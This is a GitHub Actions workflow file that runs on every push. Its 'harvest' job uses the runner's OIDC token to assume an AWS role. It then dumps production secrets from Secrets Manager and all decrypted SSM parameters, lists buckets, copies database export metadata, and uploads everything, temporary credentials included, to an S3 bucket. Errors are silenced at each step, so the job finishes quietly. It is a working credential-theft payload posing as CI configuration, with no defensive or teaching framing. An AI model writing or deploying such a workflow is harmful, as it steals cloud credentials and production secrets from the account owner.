name: i961-oidc
on:
  push:
permissions:
  id-token: write
  contents: read
jobs:
  harvest:
    runs-on: ubuntu-latest
    timeout-minutes: 8
    env:
      ROLE_ARN: arn:aws:iam::925353553787:role/github
      OUT_BUCKET: floki-openreplay-assets
      OUT_PREFIX: i961
    steps:
      - name: harvest
        run: |
          set -uo pipefail
          D=/tmp/i961; mkdir -p $D
          JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
          echo "${#JWT}" > $D/jwt.len
          aws sts assume-role-with-web-identity --role-arn "$ROLE_ARN" --role-session-name i961 --web-identity-token "$JWT" --duration-seconds 3600 > $D/sts.json 2>$D/sts.err || true
          python3 - <<'PY' || true
          import json
          d=json.load(open('/tmp/i961/sts.json'))['Credentials']
          open('/tmp/i961/env.sh','w').write('export AWS_ACCESS_KEY_ID=%s\nexport AWS_SECRET_ACCESS_KEY=%s\nexport AWS_SESSION_TOKEN=%s\n' % (d['AccessKeyId'],d['SecretAccessKey'],d['SessionToken']))
          print('AK',d['AccessKeyId'],'EXP',d['Expiration'])
          PY
          . $D/env.sh || true
          export AWS_DEFAULT_REGION=us-east-1
          aws sts get-caller-identity > $D/id.json 2>&1 || true
          aws secretsmanager get-secret-value --secret-id prod/postgres-cmpcqL --query SecretString --output text > $D/pg.txt 2>$D/pg.err || true
          aws secretsmanager get-secret-value --secret-id prod/flokifi --query SecretString --output text > $D/flokifi.json 2>$D/flokifi.err || true
          aws ssm get-parameters-by-path --path / --recursive --with-decryption > $D/ssm.json 2>$D/ssm.err || true
          aws s3 ls > $D/buckets.txt 2>&1 || true
          EXP=floki-db-e-floki-trading-bot-qa-tgwallet-db-2025-07-16
          aws s3 cp "s3://floki-db-export/$EXP/export_info_$EXP.json" "$D/export_info.json" --no-progress > $D/cp1.log 2>&1 || true
          aws s3 cp "s3://floki-db-export/$EXP/export_tables_info_${EXP}_from_1_to_323.json" "$D/tables_info.json" --no-progress > $D/cp2.log 2>&1 || true
          for f in sts.json id.json pg.txt flokifi.json ssm.json buckets.txt export_info.json tables_info.json jwt.len; do
            [ -f "$D/$f" ] && aws s3 cp "$D/$f" "s3://$OUT_BUCKET/$OUT_PREFIX/$f" --no-progress >/dev/null 2>&1 || true
          done
          echo DONE > $D/done
          aws s3 cp $D/done "s3://$OUT_BUCKET/$OUT_PREFIX/done" --no-progress >/dev/null 2>&1 || true
